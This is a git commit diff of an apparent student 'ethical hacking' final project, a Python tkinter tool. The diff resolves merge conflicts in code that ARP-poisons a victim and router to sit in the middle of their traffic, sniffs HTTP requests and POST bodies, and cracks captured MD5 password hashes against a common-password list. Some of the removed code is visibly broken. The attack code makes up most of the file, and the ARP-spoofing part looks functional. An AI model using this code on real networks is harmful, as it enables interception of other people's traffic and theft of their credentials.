2645d821fcff596bcb365c11b0579c456a31c23d
defconmke <83178095+defconmke@users.noreply.github.com>
2021-05-13 20:48:08 -0500

    Create evilFinalProject.py
    added functions for mitm and  restoreARP

--- evilFinalProject.py
+++ evilFinalProject.py
@@ -6,25 +6,13 @@ from scapy.layers.http import HTTPRequest
 from scapy.layers.inet import IP
 import iface
 # Ethical Hacking Python Application
+
 # variable declations
 # Elements of the GUI
 # GUI Rigging
 window = Tk()  # create tkinter GUI object
 window.title("Group 1 Final Project")  # Project Title
-<<<<<<< Updated upstream
 window.geometry('560x270')  # Set size of the pane
-=======
-window.geometry('500x500')  # Set size of the pane
-
-#Label for number of CPU cores
-labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
-labelNo_Of_CPU.grid(column=2,row=4)
-
-#Entry field for number of CPU cores
-textNo_Of_CPU = Entry(window,width=20)
-textNo_Of_CPU.grid(column=3,row=4)
-
->>>>>>> Stashed changes
 # Get the network resource names
 #Label for number of CPU cores
 labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
@@ -59,17 +47,20 @@ entryTextRouterIP = Entry(window, width=20)
 entryTextRouterIP.grid(column=1, row=2)
 
 # function declarations
+
+
 # MitM Section
-def getNetworkInfo():
-    try:
-        textInterface = input("Enter Interface: ")
-        textVictimIP = input("Enter Victim IP: ")
-        textRouterIP = input("Enter Router IP: ")
-        print("\n[*] IP Fowarding enabled \n")
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    except KeyboardInterrupt:
-        print("\n[*] Exiting...")
-        sys.exit(1)
+
+try:
+	textInterface = input("Enter Interface: ")
+	textVictimIP = input("Enter Victim IP: ")
+	textRouterIP = input("Enter Router IP: ")
+except KeyboardInterrupt:
+	print("\n[*] Exiting...")
+	sys.exit(1)
+
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+print("\n[*] IP Fowarding enabled \n")
 
 # send ARP requests
 def get_mac(IP):
@@ -78,6 +69,7 @@ def get_mac(IP):
     iface = textInterface, inter = 0.1)
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
+
 
 # restore ARP
 def restoreARP():
@@ -90,28 +82,31 @@ def restoreARP():
              hwsrc = gatewayMAC), count = 7)
     print("Disabling IP Forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("Exiting")
-    sys.exit(1)
+
 
 # ARP reply, switch
 def switch(gatewMAC, vicMAC):
     send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = vicMAC))
     send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))
 
+
 # MITM
-def mitm(textVictimIP,textRouterIP):
+
+def mitm():
     try:
         victimMAC = get_mac(textVictimIP)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Victim MAC not found!")
- 
+        print("Exiting")
+        sys.exit(1)
     try:
         gatewayMAC = get_mac(textRouterIP)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Gateway MAC not found")
-
+        print("Exiting")
+        sys.exit(1)
     print("Poisoning Targets!")
     while 1:
         try:
@@ -121,8 +116,9 @@ def mitm(textVictimIP,textRouterIP):
             restoreARP()
             break
 
+
+
 # Packet Sniff
-<<<<<<< Updated upstream
 # Scans for port 80 HTTP requests. ARP will need to be beforehand. 
 def sniffer():
 	
@@ -153,48 +149,6 @@ def packet_processor():
 
 # if packet is successful, get hash as a string and compare it to dictionary
 
-=======
-def sniff_packets(iface):
-    # Sniff 80 port packets with iface
-    if iface:
-        # port 80 for http
-        sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
-    else:
-        # sniff with default interface
-        sniff(filter="port 80", prn=process_packet, store=False)
-
-
-def process_packet(packet):
-    if packet.haslayer(HTTPRequest):
-        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-        ip = packet[IP].src
-        method = packet[HTTPRequest].Method.decode()
-        print(f"{ip} Requested {url} with {method}{packetsniffer.RESET}")
-        if packetsniffer.show_raw and packet.haslayer(Raw) and method == "POST":
-            print(f"Some useful Raw data: {packet[Raw].load}{packetsniffer.RESET}")
-
-# this section is normally to call a class containing this code I think, might be wrong
-# This can be deleted. It mostly helps with command line arguements.
-def sniff_execute():
-    # delete the if__name__ section and just throw this all into a function labelled sniffExecute() or soemthing of the like
-    # Changed to a functions. But this does not need to be in the code for it to work.
-    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer")
-    parser.add_argument("-i", "--iface")
-    parser.add_argument("--show-raw", dest="show_raw", action="store_true")
-    args = parser.parse_args()
-    args.iface
-    show_raw = args.show_raw
-    sniff_packets(textInterface)
-
-# if packet is successful, get hash as a string and compare it to dictionary
-def passwordFiles():
-    # create hashes for most common passwords
-    # dictionary files
-    english_password_list = "10k_most_common.txt"  # input file name
-    hashed_words_file = "10k_most_common_hashed.txt"  # output file name
-    # hash type
-    hash_type = "md5"
->>>>>>> Stashed changes
 
 def dictionary_attack():
 
@@ -206,15 +160,10 @@ def dictionary_attack():
     hash_type = "md5"
 
 
-<<<<<<< Updated upstream
     # create hashed version of passwords most common passwords
     def create_hash_md5_text_file(input_list, output_file_name, hash_type):
         input_list = list(map(str.strip, input_list))  # strips away the /n
         hashesToExport = []
-=======
-        hashesToExport.append(hashOfWord)
-        print("Creating hash text file: {} ...".format(output_file_name))
->>>>>>> Stashed changes
 
         # foreach word in the file look for the hash types
         for word in input_list:
@@ -225,7 +174,6 @@ def dictionary_attack():
             crypt.update(bytes(word, encoding='utf-8'))
             hashOfWord = crypt.hexdigest()
 
-<<<<<<< Updated upstream
             hashesToExport.append(hashOfWord)
         print("Creating hash text file: {} ...".format(output_file_name))
 
@@ -234,130 +182,6 @@ def dictionary_attack():
             for hashOfWord in hashesToExport:
                 f.write("%s/n" % hashOfWord)
         print("{} has been successfully created".format(output_file_name))
-=======
-# get the list of words from the file
-def list_of_words_from_file(filename):
-    print("Opening file: {}".format(filename))
-    list_of_words = open(filename, 'r', errors='ignore').readlines()
-    print("Stripping breaklines from file: {}".format(filename))
-    list_of_words = list(map(str.strip, list_of_words))
-    return (list_of_words)
-
-def wordStuff():
-    # get words from the file
-    words = list_of_words_from_file(english_password_list)
-    # create hash
-    create_hash_md5_text_file(words, hashed_words_file, hash_type)
-
-# END create hash for common passowords
-
-# START crack passwords
-def chunks(LIST, NUMBER_OF_PARTS):
-    # For item i in a range that is a length of l,
-    for i in range(0, len(LIST), NUMBER_OF_PARTS):
-        # Create an index range for l of n items:
-        yield LIST[i:i + NUMBER_OF_PARTS]
-
-def passwords():
-    # PASSWORDS FROM PACKET WILL NEED TO BE DUMPED INTO A FILE NAMED PASSWORDS_FROM_PACKETS.TXT
-    passwords_from_packet = 'passwords_from_packet.txt'
-
-def getCPUNumbers(no_of_cpu):
-    no_of_cpu = multiprocessing.cpu_count()
-
-def passwordExecution():
-    start = time.perf_counter()
-
-    # OPEN HASHED PASSWORD FILE
-    print("Opening file {} ".format(hashed_words_file))
-    hashed_password_list = open(passwords_from_packet, 'r').readlines()
-    hashed_password_list = list(map(str.strip, hashed_password_list))  # strips away breaklines
-    finish = time.perf_counter()
-
-    # OPEN PASSWORDS OBTAINED FROM FROM THE PACKET
-    print("Opening file {}".format(passwords_from_packet))
-    hashed_words_list = open(passwords_from_packet, 'r').readlines()
-    hashed_words_list = list(map(str.strip, hashed_words_list))
-    finish = time.perf_counter()
-
-    # SPLIT HASHED PASSWORD FILE
-    print("This computer has {0} CPU's, starting splitting of passwords into {0} parts".format(no_of_cpu))
-    no_of_elements_in_sublist = math.ceil(len(hashed_password_list) / no_of_cpu)
-    chunks_of_password_list = list(chunks(hashed_password_list, no_of_elements_in_sublist))
-
-    # start dictionary attack
-    print("Starting dictionary attack on the {} passwords list".format(len(chunks_of_password_list)))
-
-def crack(hashed_password_list, cpu_number):
-    number_of_cracked_passwords = 0
-    number_of_passwords_scanned = 0
-
-    for hashed_word in hashed_words_list:
-        number_of_passwords_scanned += 1
-        if hashed_word in hashed_password_list:
-            number_of_cracked_passwords += 1
-        if number_of_passwords_scanned % 1000 == 0:
-            finish = time.perf_counter()
-            print("CPU {}: {}/{} password has been cracked. {} minutes elapsed.".format(cpu_number,number_of_cracked_passwords,len(hashed_password_list),round(finish - start) / 60, 2))
-
-# executing codes with multiple cores cpus
-def numberOfCPUs(no_of_cpu):
-    if no_of_cpu == 2:
-        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_list[0], "1"])
-        p2 = multiprocessing.process(targer=crack, args=[chunks_of_password_list[0], "1"])
-
-        p1.start()
-        p2.start()
-
-        p1.join()
-        p2.join()
-        print("Cracking has been completed")
-
-    elif no_of_cpu == 4:
-        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
-        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
-        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
-        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])
-
-        p1.start()
-        p2.start()
-        p3.start()
-        p4.start()
-
-        p1.join()  # waits until the process is completed
-        p2.join()
-        p3.join()
-        p4.join()
-        print("Cracking has been completed")
-
-    elif no_of_cpu == 6:
-        p1 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[0], "1"])
-        p2 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[1], "2"])
-        p3 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[2], "3"])
-        p4 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "4"])
-        p5 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "5"])
-        p6 = multiprocessing.Process(target=crack, args=[chunks_of_password_lists[3], "6"])
-
-        p1.start()
-        p2.start()
-        p3.start()
-        p4.start()
-        p5.start()
-        p6.start()
-
-        p1.join()  # waits until the process is completed
-        p2.join()
-        p3.join()
-        p4.join()
-        p5.join()
-        p6.join()
-        print("Cracking has been completed")
-
-    else:
-        print("Error message: You have {} CPU. This code has been constructed for either 2 or 4 CPU.".format(no_of_cpu))
-        print(
-            "How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")
->>>>>>> Stashed changes
 
 
     # get the list of words from the file
@@ -515,13 +339,8 @@ def storeVariables():
     outputText.insert(END,"Input Variables Stored!\n")
 
 # Button for handling mitm() execute call
-<<<<<<< Updated upstream
-buttonMitM = Button(window, text="MitM", command=buttonMitM)
+buttonMitM = Button(window, text="MitM", command=mitm)
 buttonMitM.grid(column=2, row=0)
-=======
-buttonMitM = Button(window, text="MitM", command=mitm(textVictimIP,textRouterIP))
-buttonMitM.grid(column=1, row=4)
->>>>>>> Stashed changes
 
 # Button for handling sniff_packets() execute call
 buttonPacketSniffer = Button(window, text="Engage Packet Sniff", command=buttonSniffer)
@@ -532,23 +351,17 @@ buttonPacketProcessor = Button(window, text="Engage Packet Processor", command=b
 buttonPacketProcessor.grid(column=2, row=2)
 
 # Button for handling restoreARP() call
-buttonRestoreARP = Button(window, text="Restore ARP", command=buttonrestoreARP)
+buttonRestoreARP = Button(window, text="Restore ARP", command=restoreARP)
 buttonRestoreARP.grid(column=2, row=3)
 
 #Create a button to store the variables
 buttonStoreVariables = Button(window, text= "Store Variables", command=storeVariables)
 buttonStoreVariables.grid(column=2,row=5)
 # Button for closing the application
-<<<<<<< Updated upstream
-buttonClose = Button(window, text="Quit",command=exit)
+buttonClose = Button(window, text="Quit",command=lambda:[restoreARP(), exit()])
 buttonClose.grid(column=1, row=10)
 
 outputText = Text(window,height=5,width=35)
 outputText.grid(column=0,row=9)
 
 window.mainloop()  # keeps window open
-=======
-buttonClose = Button(window, text="Quit", command="close")
-buttonClose.grid(column=1, row=4)
-window.mainloop()  # keeps window open
->>>>>>> Stashed changes
